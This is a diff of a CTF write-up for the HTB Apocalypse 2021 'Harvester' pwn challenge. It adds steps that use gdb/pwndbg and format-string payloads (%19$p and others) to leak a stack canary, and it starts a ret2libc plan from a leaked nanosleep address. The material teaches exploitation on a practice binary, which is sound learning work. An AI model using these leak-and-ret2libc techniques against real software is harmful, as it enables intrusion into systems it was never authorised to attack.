@@ -1,4 +1,4 @@
-### Harvester HTB Apocalypse2021
+### Harvester HTB Apocalypse 2021
 
 ### Binary Exploitation 
 
@@ -375,8 +375,57 @@ Also we need to get an address which will make us calculate the offset to the re
 
 I like using main()
 
-So with gdb-pwngdb i'll calculate it
+So with gdb-pwngdb i'll calculate the offset needed to get to the main address
 ![image](https://user-images.githubusercontent.com/113513376/222282028-e19ebbb2-8bb8-4115-a306-dd3516686fcd.png)
+
+With that set i need to get the offset of the stack canary
+![image](https://user-images.githubusercontent.com/113513376/222282751-e2a2a0a8-4665-4aa5-945c-d0afc9c4d1ac.png)
+
+```
+gdb-pwngdb harvester
+break main
+ni
+ni
+ni
+x $rax
+```
+
+We see that the canary is `0xa6c6c3a056a4cb00` now lets continue the program execution
+![image](https://user-images.githubusercontent.com/113513376/222282999-c6fe53db-1b72-4c24-b6f1-801d1e2fd605.png)
+
+```
+continue
+```
+
+Looking at it shows that the offset is not at offset 11 cause its value isn't equal to `0x6da4dbd944578d00`
+
+I'll repeat the same step for offset
+
+```
+%15$p
+%19$p
+%39$p
+```
+
+Note that the canary address always changes each time the program runs
+
+After trying it i got that the offset to canary is at offset 19
+![image](https://user-images.githubusercontent.com/113513376/222283415-3d5ac62e-3f8a-4fd2-9eed-73745706dc7b.png)
+![image](https://user-images.githubusercontent.com/113513376/222283499-11cf4c67-4429-4629-8206-76df50976b6d.png)
+
+Cool now that we know that and we have everything neccessary to craft the exploit 
+
+Lets perform ret2libc. Since initially we leaked the libc address of nanosleep we can now calculate the value of the libc base address
+
+Also note that we need to subtract 35 from the leaked nanosleep address so that we can get to the base address of nanosleep
+![image](https://user-images.githubusercontent.com/113513376/222284388-5016701b-a1be-4679-9b8c-fdc10799bc7d.png)
+
+```
+pwndbg> x 0x7ffff7e983b3
+0x7ffff7e983b3 <__GI___clock_nanosleep+35>:     0x66c3d8f7
+pwndbg>
+```
+
 
 
 
